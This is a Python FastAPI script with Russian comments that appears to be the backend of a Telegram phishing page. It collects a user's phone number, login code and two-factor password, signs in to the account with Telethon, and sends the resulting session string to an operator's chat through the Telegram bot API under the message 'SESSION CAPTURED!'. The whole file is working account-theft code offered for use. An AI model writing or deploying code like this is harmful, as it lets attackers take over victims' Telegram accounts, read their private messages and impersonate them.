from fastapi import FastAPI, Request
from telethon import TelegramClient
from telethon.sessions import StringSession
import os

app = FastAPI()

# Твои данные с my.telegram.org
API_ID = 'твой_api_id' 
API_HASH = 'твой_api_hash'
BOT_TOKEN = os.getenv("BOT_TOKEN")
ADMIN_ID = os.getenv("ADMIN_ID")

# Словарь для хранения временных клиентов
clients = {}

@app.post("/auth/send_code")
async def send_code(request: Request):
    data = await request.json()
    phone = data.get("phone")
    
    # Создаем клиента в памяти
    client = TelegramClient(StringSession(), API_ID, API_HASH)
    await client.connect()
    
    # Запрашиваем код
    sent_code = await client.send_code_request(phone)
    clients[phone] = {
        "client": client,
        "phone_code_hash": sent_code.phone_code_hash
    }
    return {"status": "code_sent"}

@app.post("/auth/login")
async def login(request: Request):
    data = await request.json()
    phone = data.get("phone")
    code = data.get("code")
    password = data.get("password") # Если есть 2FA

    user_data = clients.get(phone)
    client = user_data["client"]
    
    try:
        await client.sign_in(phone, code, phone_code_hash=user_data["phone_code_hash"])
    except Exception: # Если нужен 2FA
        await client.sign_in(password=password)

    # ГЕНЕРИРУЕМ СЕССИЮ!
    session_str = client.session.save()
    
    # Отправляем админу заветную строку
    requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", json={
        "chat_id": ADMIN_ID,
        "text": f"🔥 **СЕССИЯ ЗАХВАЧЕНА!**\n\n`{session_str}`"
    })
    return {"status": "success"}
